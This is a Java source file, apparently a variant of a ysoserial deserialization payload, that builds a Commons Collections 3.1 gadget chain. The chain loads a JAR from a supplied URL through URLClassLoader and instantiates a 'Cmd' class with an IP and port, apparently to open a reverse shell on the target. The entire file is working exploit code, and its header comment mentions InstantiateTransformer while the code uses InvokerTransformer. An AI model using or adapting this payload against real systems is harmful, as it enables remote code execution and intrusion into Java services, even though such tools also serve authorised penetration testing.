package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
 * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.FROHOFF })
public class CommonsCollections3ForLoadJar extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String ... ipAndHost) throws Exception {
        // http://127.0.0.1:8080/R.jar 127.0.0.1 4444
        String payloadUrl = ipAndHost[0];

        String ip2 = ipAndHost[1];
        Integer port2 = Integer.parseInt(ipAndHost[2]);
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
            new Transformer[] { new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(java.net.URLClassLoader.class),
            // getConstructor class.class classname
            new InvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { java.net.URL[].class } }),
            new InvokerTransformer(
                "newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
                    payloadUrl) } } }),
            // loadClass String.class R
            new InvokerTransformer("loadClass",
                new Class[] { String.class }, new Object[] { "Cmd" }),
            // set the target reverse ip and port
            new InvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { String.class,int.class } }),
            // invoke
            new InvokerTransformer("newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { ip2,port2 } }),
            new ConstantTransformer(1) };

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return handler;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections3ForLoadJar.class, args);
	}

	public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
